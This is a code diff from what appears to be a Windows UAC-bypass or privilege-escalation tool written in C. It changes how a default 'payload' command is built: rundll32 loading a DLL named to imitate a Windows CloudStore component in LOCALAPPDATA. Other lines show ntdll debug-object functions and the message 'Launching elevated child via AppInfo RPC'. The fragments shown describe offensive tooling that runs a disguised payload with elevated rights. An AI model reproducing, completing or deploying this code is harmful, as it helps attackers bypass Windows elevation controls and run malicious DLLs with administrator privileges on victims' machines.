@@ -66,9 +66,21 @@ static PDbgUiSetThreadDebugObject pDbgUiSetThreadDebugObject;
 static WCHAR g_systemDir[MAX_PATH];
 static WCHAR g_systemRoot[MAX_PATH];
 
-static const WCHAR kDefaultPayload[] =
-    L"C:\\Windows\\System32\\rundll32.exe "
-    L"\"C:\\users\\surel\\appdata\\local\\microsoft\\windows\\CloudStore\\Shell\\Windows.CloudStore.Schema.Shell.dll\",Start";
+static BOOL build_default_payload(WCHAR *buf, DWORD cap) {
+    WCHAR localAppData[MAX_PATH];
+
+    if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0)
+        return FALSE;
+
+    if (_snwprintf(
+            buf, cap,
+            L"C:\\Windows\\System32\\rundll32.exe "
+            L"\"%s\\Microsoft\\Windows\\CloudStore\\Shell\\Windows.CloudStore.Schema.Shell.dll\",Start",
+            localAppData) <= 0)
+        return FALSE;
+
+    return TRUE;
+}
 
 static BOOL init_ntdll(void) {
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
@@ -468,14 +480,15 @@ int wmain(int argc, wchar_t **argv) {
     }
 
     if (argc >= 2) {
-        payload = argv[1];
+        wcsncpy(payloadBuf, argv[1], MAX_PATH * 4 - 1);
+        payloadBuf[MAX_PATH * 4 - 1] = L'\0';
+        payload = payloadBuf;
+    } else if (!build_default_payload(payloadBuf, MAX_PATH * 4)) {
+        printf("[-] Failed to build default payload (LOCALAPPDATA).\n");
+        return 1;
     } else {
-        payload = (LPWSTR)kDefaultPayload;
+        payload = payloadBuf;
     }
-
-    wcsncpy(payloadBuf, payload, MAX_PATH * 4 - 1);
-    payloadBuf[MAX_PATH * 4 - 1] = L'\0';
-    payload = payloadBuf;
 
     //printf("[*] Payload: %ls\n", payload);
     printf("[*] Launching elevated child via AppInfo RPC...\n");
